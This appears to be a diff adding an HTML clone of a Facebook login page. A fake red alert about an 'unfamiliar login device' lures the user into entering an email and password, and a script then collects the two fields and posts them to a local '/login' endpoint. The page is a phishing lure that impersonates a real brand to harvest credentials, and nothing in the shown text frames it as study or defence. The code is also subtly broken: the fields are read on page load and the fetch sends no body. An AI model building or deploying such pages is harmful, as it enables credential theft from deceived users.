@@ -1,0 +1,115 @@
+<!doctype html>
+<html>
+<head>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      background: linear-gradient(to right,white,lightblue);
+      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, Sans-Serif;
+    }
+    div.lang {
+      text-align: center;
+      opacity: 0.5;
+    }
+    img {
+      padding: 20px;
+      width: 30%;
+    }
+    .input {
+      width: 95%;
+      padding: 20px;
+      border: 1px transparent;
+      border-radius: 10px;
+      margin: 10px;
+    }
+    button {
+      width: 95%;
+      background-color: #0033e9;
+      opacity: 0.85;
+      padding: 15px;
+      border: 1px transparent;
+      font-weight: bold;
+      border-radius: 25px;
+      color: white;
+    }
+    p {
+      text-align: center;
+
+    }
+    .C {
+      width: 95%;
+      background: transparent;
+      padding: 15px;
+      border: 0.7px solid #0083ec;
+      margin-top: 50px;
+      border-radius: 25px;
+      color: #0083ec;
+    }
+    .forgot {
+      font-weight: bold;
+      color: #444;
+    }
+    .my-alert {
+      background: rgba(209,86,86,0.7);
+      width: 100%;
+      padding: 10px;
+      border: 0px solid;
+      position: fixed;
+      top: 0;
+      left: 0;
+    }
+    .container {
+      margin-top: 100px;
+    }
+  </style>
+</head>
+<body>
+  <div class="my-alert">
+    <strong>John Doe</strong>, we have detected an unfamiliar login device. Login to verify approve or decline the unfamiliar login.
+  </div>
+  <div class="container">
+    <div class="lang">
+      English(US)
+    </div>
+    <img src="Facebook-logo.png" alt="">
+    <form action="/login" method="post">
+    <input type="Email" class="input" id="email" placeholder="Mobile number or Email">
+    <input type="password" class="input" id="password" placeholder="Password">
+    </form>
+    <button type="submit">Log in</button>
+    <p class="forgot">
+      Forgot password?
+    </p>
+    <button class="C">
+      Create new account
+    </button>
+    <img src="Meta-Emblem.png" alt="">
+
+    <div class="lang">
+      <span>About</span>
+      <span>Help</span>
+      <span>More</span>
+    </div>
+  </div>
+
+</body>
+<script>
+const formData = new FormData();
+formData.append('email', document.getElementById('email').value);
+formData.append('password', document.getElementById('password').value);
+
+fetch('/login', {
+  method: 'post',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  }
+})
+  
+</script>
+</html>
